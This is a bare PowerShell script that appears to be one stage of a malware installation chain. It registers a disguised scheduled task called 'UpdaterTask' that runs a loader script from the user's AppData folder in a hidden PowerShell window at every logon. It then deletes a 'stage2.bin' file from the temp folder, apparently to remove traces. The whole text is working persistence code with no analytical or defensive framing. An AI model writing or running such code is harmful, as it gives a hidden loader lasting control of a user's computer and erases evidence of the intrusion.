
[CmdletBinding()]
param(
    [string]$TaskName = "UpdaterTask",
    [string]$ScriptPath = "$env:APPDATA\loader.ps1",
    [int]$StartDelayMinutes = 48
)
$ErrorActionPreference = "Stop"

$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -WindowStyle Hidden -File `"$env:APPDATA\loader.ps1`""
$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Force
$TaskState = Get-ScheduledTask -TaskName $TaskName
Write-Verbose ("Task state: " + $TaskState.State)

Write-Verbose "stage marker 5 reached"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
